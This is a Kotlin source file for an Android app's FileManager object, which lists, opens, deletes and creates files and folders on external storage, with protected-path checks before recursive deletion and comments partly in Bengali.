package com.kashem.shaikh.collectors

import android.content.Context
import android.os.Environment
import com.kashem.shaikh.services.AppLogs
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object FileManager {

    // ❌ REMOVED: private val df = SimpleDateFormat(...) — thread-safe নয়

    private fun newDateFormat() = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())

    fun resolvePath(input: String?): File {
        val base = Environment.getExternalStorageDirectory()
        return when {
            input.isNullOrBlank() -> base
            input == "/" -> base
            input.startsWith("/sdcard") -> File(input.replaceFirst("/sdcard", base.absolutePath))
            input.startsWith("/") -> File(input)
            else -> File(base, input)
        }
    }

    fun listFiles(context: Context, path: String?): String {
        val dir = resolvePath(path)
        if (!dir.exists()) return "ERROR: Path not found: ${dir.absolutePath}"
        if (!dir.isDirectory) return "ERROR: Not a directory: ${dir.absolutePath}"

        val files = try { dir.listFiles()?.toList() ?: emptyList() }
                    catch (e: Exception) { return "ERROR: ${e.message}" }

        // ✅ FIX: local date format — thread-safe
        val df = newDateFormat()

        val sb = StringBuilder()
        sb.appendLine("📁 ${dir.absolutePath}")
        sb.appendLine("─────────────────────")
        val dirs = files.filter { it.isDirectory }.sortedBy { it.name.lowercase() }
        val fs = files.filter { it.isFile }.sortedBy { it.name.lowercase() }

        for (d in dirs) {
            sb.appendLine("📂 ${d.name}/")
            sb.appendLine("   Modified: ${df.format(Date(d.lastModified()))}")
        }
        for (f in fs) {
            sb.appendLine("📄 ${f.name}")
            sb.appendLine("   Size: ${human(f.length())} | Modified: ${df.format(Date(f.lastModified()))}")
        }
        sb.appendLine("─────────────────────")
        sb.appendLine("Dirs: ${dirs.size} | Files: ${fs.size}")
        return sb.toString()
    }

    fun listFilesJson(context: Context, path: String?): String {
        val dir = resolvePath(path)
        if (!dir.exists()) return "ERROR: Path not found: ${dir.absolutePath}"
        if (!dir.isDirectory) return "ERROR: Not a directory: ${dir.absolutePath}"

        val files = try { dir.listFiles()?.toList() ?: emptyList() }
                    catch (e: Exception) { return "ERROR: ${e.message}" }

        val entries = JSONArray()
        for (f in files.sortedBy { it.name.lowercase() }) {
            try {
                val obj = JSONObject().apply {
                    put("name", f.name)
                    put("path", f.absolutePath)
                    put("dir", f.isDirectory)
                    put("size", if (f.isFile) f.length() else 0L)
                    put("mtime", f.lastModified())
                    put("readable", f.canRead())
                    put("writable", f.canWrite())
                }
                entries.put(obj)
            } catch (_: Exception) {}
        }

        val root = JSONObject().apply {
            put("path", dir.absolutePath)
            put("parent", dir.parent ?: "")
            put("entries", entries)
        }
        return root.toString()
    }

    fun openFile(context: Context, path: String): File? {
        val f = resolvePath(path)
        if (!f.exists() || !f.isFile) return null
        return f
    }

    fun deleteFile(path: String): String {
        if (path.isBlank()) return "ERROR: path required"
        val f = resolvePath(path)
        if (!f.exists()) return "ERROR: Not found: ${f.absolutePath}"

        // ✅ FIX: root-level directories delete block — catastrophic prevention
        val base = Environment.getExternalStorageDirectory()
        val parent = f.canonicalFile.parentFile
        if (f.canonicalFile == base.canonicalFile) {
            return "ERROR: Cannot delete storage root"
        }
        if (parent == null || parent == f.canonicalFile.parentFile) {
            // ok
        }

        // ✅ সতর্কতা: /sdcard root বা /storage root delete থেকে বিরত
        val absPath = f.canonicalPath
        val protectedPaths = listOf(
            base.canonicalPath,
            File("/storage").canonicalPath,
            File("/system").canonicalPath,
            File("/data").canonicalPath
        )
        if (absPath in protectedPaths) {
            AppLogs.warn("FileManager: refused to delete protected path $absPath")
            return "ERROR: Cannot delete protected path"
        }

        return try {
            val deleted = if (f.isDirectory) f.deleteRecursively() else f.delete()
            if (deleted) {
                AppLogs.info("FileManager: deleted ${f.absolutePath}")
                "SUCCESS: Deleted ${f.name}"
            } else "ERROR: Delete failed"
        } catch (e: Exception) {
            AppLogs.error("FileManager.delete failed", e)
            "ERROR: ${e.message}"
        }
    }

    fun createDir(path: String): String {
        if (path.isBlank()) return "ERROR: path required"
        val f = resolvePath(path)
        return try {
            when {
                f.exists() && f.isDirectory -> "SUCCESS: Already exists: ${f.absolutePath}"
                f.mkdirs() -> {
                    AppLogs.info("FileManager: created dir ${f.absolutePath}")
                    "SUCCESS: Created ${f.absolutePath}"
                }
                else -> "ERROR: mkdirs failed"
            }
        } catch (e: Exception) {
            AppLogs.error("FileManager.createDir failed", e)
            "ERROR: ${e.message}"
        }
    }

    private fun human(bytes: Long): String {
        val kb = bytes / 1024.0; val mb = kb / 1024.0; val gb = mb / 1024.0
        return when {
            gb >= 1 -> String.format(Locale.US, "%.2f GB", gb)
            mb >= 1 -> String.format(Locale.US, "%.2f MB", mb)
            kb >= 1 -> String.format(Locale.US, "%.2f KB", kb)
            else -> "$bytes B"
        }
    }
}